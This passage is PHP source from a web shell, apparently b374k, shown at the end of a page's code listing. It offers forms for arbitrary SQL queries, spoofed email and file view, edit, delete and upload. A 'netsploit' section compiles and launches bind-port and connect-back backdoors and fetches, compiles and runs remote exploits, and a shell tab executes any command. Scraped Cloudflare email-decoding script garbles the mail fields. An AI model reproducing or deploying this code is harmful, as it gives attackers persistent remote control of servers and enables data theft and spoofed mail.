                $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">" . $query . "</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                @mysql_select_db($db);
                $querys = explode(";", $query);
                foreach ($querys as $query) {
                    if (trim($query) != "") {
                        $hasil = mysql_query($query);
                        if ($hasil) {
                            $msg.= "<p style=\"padding:0;margin:20px 6px 0 6px;\">" . $query . ";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>";
                            $msg.= "<table class=\"explore\" style=\"width:99%;\"><tr>";
                            for ($i = 0;$i < @mysql_num_fields($hasil);$i++) $msg.= "<th>" . htmlspecialchars(@mysql_field_name($hasil, $i)) . "</th>";
                            $msg.= "</tr>";
                            for ($i = 0;$i < @mysql_num_rows($hasil);$i++) {
                                $rows = @mysql_fetch_array($hasil);
                                $msg.= "<tr>";
                                for ($j = 0;$j < @mysql_num_fields($hasil);$j++) {
                                    if ($rows[$j] == "") $dataz = "&nbsp;";
                                    else $dataz = $rows[$j];
                                    $msg.= "<td>" . $dataz . "</td>";
                                }
                                $msg.= "</tr>";
                            }
                            $msg.= "</table>";
                        } else $msg.= "<p style=\"padding:0;margin:20px 6px 0 6px;\">" . $query . ";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
                    }
                }
            } else {
                $query = "SHOW PROCESSLIST;
SHOW VARIABLES;
SHOW STATUS;";
                $msg = "<div style=\"width:99%;padding:0 10px;\"><form action=\"?\" method=\"get\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /> <input type=\"hidden\" name=\"x\" value=\"mysql\" /> <input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /> <input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /> <input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /> <input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /> <input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">" . $query . "</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
                $dbs = array();
                $msg.= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>";
                $hasil = @mysql_list_dbs($con);
                while (list($db) = @mysql_fetch_row($hasil)) {
                    @array_push($dbs, $db);
                }
                @sort($dbs);
                foreach ($dbs as $db) {
                    $msg.= "<tr><td><a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "\">$db</a></td></tr>";
                }
                $msg.= "</table>";
            }
            @mysql_close($con);
        } else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>";
        echo $msg;
    } else { ?> <form action="?" method="get"> <input type="hidden" name="y" value="<?php echo $pwd; ?>" /> <input type="hidden" name="x" value="mysql" /> <table class="tabnet" style="width:300px;"> <tr><th colspan="2">Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr> </table> </form> <?php
    }
} elseif (isset($_GET['x']) && ($_GET['x'] == 'mail')) {
    if (isset($_POST['mail_send'])) {
        $mail_to = $_POST['mail_to'];
        $mail_from = $_POST['mail_from'];
        $mail_subject = $_POST['mail_subject'];
        $mail_content = magicboom($_POST['mail_content']);
        if (@mail($mail_to, $mail_subject, $mail_content, "FROM:$mail_from")) {
            $msg = "email sent to $mail_to";
        } else $msg = "send email failed";
    } ?> <form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post"> <table class="cmdbox"> <tr><td> <textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ASAP ;-p</textarea> <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
" name="mail_to" />&nbsp; mail to</td></tr> <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="b374k@fbi.gov
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
" name="mail_from" />&nbsp; from</td></tr> <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr> <tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form> <tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr> </table> </form> <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'phpinfo')) {
    @ob_start();
    eval("phpinfo();");
    $buff = @ob_get_contents();
    @ob_end_clean();
    $awal = strpos($buff, "<body>") + 6;
    $akhir = strpos($buff, "</body>");
    echo "<div class=\"phpinfo\">" . substr($buff, $awal, $akhir - $awal) . "</div>";
} elseif (isset($_GET['view']) && ($_GET['view'] != "")) {
    if (is_file($_GET['view'])) {
        if (!isset($file)) $file = magicboom($_GET['view']);
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . "<span class=\"gaya\"> : </span>" . $group['name'];
        } else {
            $owner = $user;
        }
        $filn = basename($file);
        echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\"> <tr><td>Filename</td><td><span id=\"" . clearspace($filn) . "_link\">" . $file . "</span> <form action=\"?y=" . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"oldname\" value=\"" . $filn . "\" style=\"margin:0;padding:0;\" /> <input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $filn . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /> </form> </td></tr> <tr><td>Size</td><td>" . ukuran($file) . "</td></tr> <tr><td>Permission</td><td>" . get_perms($file) . "</td></tr> <tr><td>Owner</td><td>" . $owner . "</td></tr> <tr><td>Create time</td><td>" . date("d-M-Y H:i", @filectime($file)) . "</td></tr> <tr><td>Last modified</td><td>" . date("d-M-Y H:i", @filemtime($file)) . "</td></tr> <tr><td>Last accessed</td><td>" . date("d-M-Y H:i", @fileatime($file)) . "</td></tr> <tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr> <tr><td>View</td><td><a href=\"?y=" . $pwd . "&amp;view=" . $file . "\">text</a> | <a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\">code</a> | <a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=image\">image</a></td></tr> </table> ";
        if (isset($_GET['type']) && ($_GET['type'] == 'image')) {
            echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=" . $pwd . "&amp;img=" . $filn . "\"></div>";
        } elseif (isset($_GET['type']) && ($_GET['type'] == 'code')) {
            echo "<div class=\"viewfile\">";
            $file = wordwrap(@file_get_contents($file), "240", "
");
            @highlight_string($file);
            echo "</div>";
        } else {
            echo "<div class=\"viewfile\">";
            echo nl2br(htmlentities((@file_get_contents($file))));
            echo "</div>";
        }
    } elseif (is_dir($_GET['view'])) {
        echo showdir($pwd, $prompt);
    }
} elseif (isset($_GET['edit']) && ($_GET['edit'] != "")) {
    if (isset($_POST['save'])) {
        $file = $_POST['saveas'];
        $content = magicboom($_POST['content']);
        if ($filez = @fopen($file, "w")) {
            $time = date("d-M-Y H:i", time());
            if (@fwrite($filez, $content)) $msg = "file saved <span class=\"gaya\">@</span> " . $time;
            else $msg = "failed to save";
            @fclose($filez);
        } else $msg = "permission denied";
    }
    if (!isset($file)) $file = $_GET['edit'];
    if ($filez = @fopen($file, "r")) {
        $content = "";
        while (!feof($filez)) {
            $content.= htmlentities(str_replace("''", "'", fgets($filez)));
        }
        @fclose($filez);
    } ?> <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post"> <table class="cmdbox"> <tr><td colspan="2"> <textarea class="output" name="content"> <?php echo $content; ?> </textarea> <tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?></td></tr> </table> </form> <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'upload')) {
    if (isset($_POST['uploadcomp'])) {
        if (is_uploaded_file($_FILES['file']['tmp_name'])) {
            $path = magicboom($_POST['path']);
            $fname = $_FILES['file']['name'];
            $tmp_name = $_FILES['file']['tmp_name'];
            $pindah = $path . $fname;
            $stat = @move_uploaded_file($tmp_name, $pindah);
            if ($stat) {
                $msg = "file uploaded to $pindah";
            } else $msg = "failed to upload $fname";
        } else $msg = "failed to upload $fname";
    } elseif (isset($_POST['uploadurl'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $path = magicboom($_POST['path']);
        $namafile = download($pilihan, $wurl);
        $pindah = $path . $namafile;
        if (is_file($pindah)) {
            $msg = "file uploaded to $pindah";
        } else $msg = "failed to upload $namafile";
    } ?> <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"> <table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Upload from computer</th></tr> <tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> </tr> </table></form> <table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Upload from url</th></tr> <tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"> <table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'netsploit')) {
    if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
        $port = trim($_POST['port']);
        $passwrd = trim($_POST['bind_pass']);
        tulis("bdc.c", $port_bind_bd_c);
        exe("gcc -o bdc bdc.c");
        exe("chmod 777 bdc");
        @unlink("bdc.c");
        exe("./bdc " . $port . " " . $passwrd . " &");
        $scan = exe("ps aux");
        if (eregi("./bdc $por", $scan)) {
            $msg = "<p>Process found running, backdoor setup successfully.</p>";
        } else {
            $msg = "<p>Process not found running, backdoor not setup successfully.</p>";
        }
    } elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
        $port = trim($_POST['port']);
        $passwrd = trim($_POST['bind_pass']);
        tulis("bdp", $port_bind_bd_pl);
        exe("chmod 777 bdp");
        $p2 = which("perl");
        exe($p2 . " bdp " . $port . " &");
        $scan = exe("ps aux");
        if (eregi("$p2 bdp $port", $scan)) {
            $msg = "<p>Process found running, backdoor setup successfully.</p>";
        } else {
            $msg = "<p>Process not found running, backdoor not setup successfully.</p>";
        }
    } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
        $ip = trim($_POST['ip']);
        $port = trim($_POST['backport']);
        tulis("bcc.c", $back_connect_c);
        exe("gcc -o bcc bcc.c");
        exe("chmod 777 bcc");
        @unlink("bcc.c");
        exe("./bcc " . $ip . " " . $port . " &");
        $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
    } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
        $ip = trim($_POST['ip']);
        $port = trim($_POST['backport']);
        tulis("bcp", $back_connect);
        exe("chmod +x bcp");
        $p2 = which("perl");
        exe($p2 . " bcp " . $ip . " " . $port . " &");
        $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
    } elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $namafile = download($pilihan, $wurl);
        if (is_file($namafile)) {
            $msg = exe($wcmd);
        } else $msg = "error: file not found $namafile";
    } ?> <table class="tabnet"> <tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr> <tr> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr> <tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form> </table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr> <tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form> </table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr> <tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> </tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form> </table> </td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?> <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"> <table class="cmdbox"> <tr><td colspan="2"> <textarea class="output" readonly> <?php if (isset($_POST['submitcmd'])) {
        echo @exe($_POST['cmd']);
    } ?> </textarea> <tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr> </table> </form> <?php
} else {
    if (isset($_GET['delete']) && ($_GET['delete'] != "")) {
        $file = $_GET['delete'];
        @unlink($file);
    } elseif (isset($_GET['fdelete']) && ($_GET['fdelete'] != "")) {
        @rmdir(rtrim($_GET['fdelete'], DIRECTORY_SEPARATOR));
    } elseif (isset($_GET['mkdir']) && ($_GET['mkdir'] != "")) {
        $path = $pwd . $_GET['mkdir'];
        @mkdir($path);
    }
    $buff = showdir($pwd, $prompt);
    echo $buff;
} ?> </div> </body> </html>
{% endhighlight %}